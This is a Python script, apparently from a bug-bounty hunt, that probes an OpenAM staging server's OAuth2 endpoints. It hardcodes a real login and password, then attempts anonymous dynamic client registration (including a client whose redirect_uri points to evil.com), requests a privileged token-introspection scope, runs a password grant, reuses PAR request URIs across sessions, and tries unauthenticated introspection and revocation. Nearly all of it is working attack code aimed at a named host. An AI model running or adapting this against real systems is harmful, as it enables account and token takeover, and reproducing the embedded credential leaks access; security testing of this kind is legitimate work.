# -*- coding: utf-8 -*-
"""AIC 第四十五轮:动态客户端注册(DCR)+ 高权限 scope + ROPC + PAR 全流程
上轮信号:.well-known 泄露 registration_endpoint、am-introspect-all-tokens scope、
   password/client_credentials grant、PAR 201。
承诺(设计):OAuth2 客户端必须由管理员配置(redirect_uri 白名单),token 权限
   按客户端授权。反例:匿名注册自有客户端 -> 自定义 redirect_uri + 高权限 token。
本轮:
A. POST /am/oauth2/alpha/register 匿名 DCR(拿 client_id/secret)
B. authorize scope=am-introspect-all-tokens(是否授予)
C. ROPC password grant(pccp 凭据,public client)
D. PAR 全流程:PAR -> authorize?request_uri -> code -> token;跨会话复用测试
E. introspection/revoke 无认证测试
预期结果表:
  成立 -> DCR 201 且新 client 可换高权限 token;或 am-introspect-all-tokens 可授予
"""
import requests, urllib3, json, time
from urllib.parse import quote
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
TOKEN_EP = BASE + '/am/oauth2/alpha/access_token'
RU = 'https://openam-bug-bounty-stag.forgeblocks.com/enduser/sessionCheck.html'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
COOKIE_NAME = 'aa942d46ece12ce'
FORM = {'Content-Type': 'application/x-www-form-urlencoded'}

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})

r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
S.headers.update({'Cookie': COOKIE_NAME + '=' + tok,
                  'Accept-API-Version': 'resource=2.1, protocol=1.0'})
print('LOGIN OK')

print('\n=== A. 匿名动态客户端注册 ===')
dcr_bodies = [
    {'client_name': 'hunt-test-1', 'redirect_uris': [RU], 'grant_types': ['authorization_code'],
     'token_endpoint_auth_method': 'none', 'application_type': 'web', 'response_types': ['code']},
    {'client_name': 'hunt-test-2', 'redirect_uris': ['https://evil.com/cb'], 'grant_types': ['authorization_code'],
     'token_endpoint_auth_method': 'none', 'application_type': 'web'},
    {'client_name': 'hunt-test-3', 'redirect_uris': [RU], 'grant_types': ['client_credentials'],
     'token_endpoint_auth_method': 'client_secret_basic'},
    {'client_name': 'hunt-test-4', 'redirect_uris': [RU], 'grant_types': ['authorization_code'],
     'token_endpoint_auth_method': 'client_secret_post', 'response_types': ['code']},
]
for i, b in enumerate(dcr_bodies):
    try:
        r = S.post(BASE + '/am/oauth2/alpha/register', json=b, timeout=15, verify=False)
        print('[%d] DCR %-70s -> %d %s' % (i, b['client_name'] + '|' + str(b.get('grant_types'))[:30],
              r.status_code, r.text[:200].replace('\n', ' ')))
    except Exception as e:
        print('[%d] DCR ERR %s' % (i, str(e)[:80]))
    time.sleep(0.5)

print('\n=== B. authorize scope=am-introspect-all-tokens ===')
p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code' \
    '&redirect_uri=%s&scope=%s&state=t' % (quote(RU, safe=''), quote('openid am-introspect-all-tokens', safe=''))
r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
loc = r.headers.get('Location', '')
print('authorize(am-introspect-all-tokens) -> %d code=%s %s' % (r.status_code, 'Y' if 'code=' in loc else 'N',
      loc[:160]))
if 'code=' in loc:
    code = loc.split('code=')[1].split('&')[0]
    r2 = S.post(TOKEN_EP, data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                                'client_id': 'endUserUIClient'}, headers=FORM, timeout=12, verify=False)
    print('token: %d %s' % (r2.status_code, r2.text[:300].replace('\n', ' ')))

print('\n=== C. ROPC password grant ===')
for body in [{'grant_type': 'password', 'username': USER, 'password': PASS, 'client_id': 'endUserUIClient'},
             {'grant_type': 'password', 'username': USER, 'password': PASS, 'client_id': 'endUserUIClient',
              'scope': 'openid'}]:
    r = S.post(TOKEN_EP, data=body, headers=FORM, timeout=12, verify=False)
    print('ROPC %-40s -> %d %s' % (str(body)[:40], r.status_code, r.text[:200].replace('\n', ' ')))
    time.sleep(0.5)

print('\n=== D. PAR 全流程 ===')
r = S.post(BASE + '/am/oauth2/alpha/par',
           data={'client_id': 'endUserUIClient', 'response_type': 'code', 'redirect_uri': RU,
                 'scope': 'openid'},
           headers=FORM, timeout=12, verify=False)
ru_uri = r.json().get('request_uri', '')
print('PAR request_uri:', ru_uri)
p = '/am/oauth2/alpha/authorize?client_id=endUserUIClient&request_uri=%s' % quote(ru_uri, safe='')
r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
loc = r.headers.get('Location', '')
print('authorize?request_uri -> %d code=%s %s' % (r.status_code, 'Y' if 'code=' in loc else 'N', loc[:160]))
if 'code=' in loc:
    code = loc.split('code=')[1].split('&')[0]
    r2 = S.post(TOKEN_EP, data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                                'client_id': 'endUserUIClient'}, headers=FORM, timeout=12, verify=False)
    print('token: %d %s' % (r2.status_code, r2.text[:200].replace('\n', ' ')))
# 跨会话复用 request_uri
S0 = requests.Session()
S0.trust_env = False
S0.proxies = {'http': None, 'https': None}
r = S0.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
print('S0(匿名) authorize?request_uri -> %d %s' % (r.status_code, r.headers.get('Location', '')[:120]))

print('\n=== E. introspection/revoke 无认证 ===')
p = '/am/oauth2/realms/alpha/authorize?client_id=endUserUIClient&response_type=code' \
    '&redirect_uri=%s&scope=%s&state=t' % (quote(RU, safe=''), quote('openid', safe=''))
r = S.get(BASE + p, timeout=15, verify=False, allow_redirects=False)
loc = r.headers.get('Location', '')
at = None
if 'code=' in loc:
    code = loc.split('code=')[1].split('&')[0]
    r2 = S.post(TOKEN_EP, data={'grant_type': 'authorization_code', 'code': code, 'redirect_uri': RU,
                                'client_id': 'endUserUIClient'}, headers=FORM, timeout=12, verify=False)
    at = r2.json().get('access_token')
if at:
    for data in [{'token': at}, {'token': at, 'client_id': 'endUserUIClient'}]:
        r = S.post(BASE + '/am/oauth2/alpha/introspect', data=data, headers=FORM, timeout=12, verify=False)
        print('introspect %s -> %d %s' % (str(data)[:40], r.status_code, r.text[:250].replace('\n', ' ')))
        time.sleep(0.5)
    r = S.post(BASE + '/am/oauth2/alpha/token/revoke', data={'token': at}, headers=FORM, timeout=12, verify=False)
    print('revoke(无认证) -> %d %s' % (r.status_code, r.text[:150].replace('\n', ' ')))
